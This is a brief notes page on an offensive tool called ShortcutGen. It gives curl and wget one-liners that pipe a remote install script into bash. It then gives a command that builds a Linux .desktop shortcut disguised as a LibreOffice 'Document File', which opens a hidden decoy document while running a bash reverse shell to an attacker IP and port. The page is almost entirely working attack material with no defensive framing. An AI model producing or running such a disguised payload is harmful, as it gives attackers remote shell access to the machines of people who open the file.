# Offensive Tools

## Scripts

### ShortcutGen

#### Setup

Run the installer.

```
$ bash -c "$(curl --proto '=https' --tlsv1.2 -sSfL "https://raw.githubusercontent.com/U53RW4R3/ShortcutGen/master/install.sh")"

$ bash -c "$(wget -qO - "https://raw.githubusercontent.com/U53RW4R3/ShortcutGen/master/install.sh")"
```

#### Generate Payload

Generate a payload with one-liner reverse shell.

```
$ shortcutgen -p desktop -n "Document File" -c "libreoffice" -a " --writer \"\$(pwd)/.real_document.odt\"; /bin/bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1" --icon "libreoffice-writer" --workingdirectory "/tmp/" -w "false" -o payload.desktop
```

---
## References

### Source Repositories

- [ShortcutGen](https://github.com/U53RW4R3/ShortcutGen)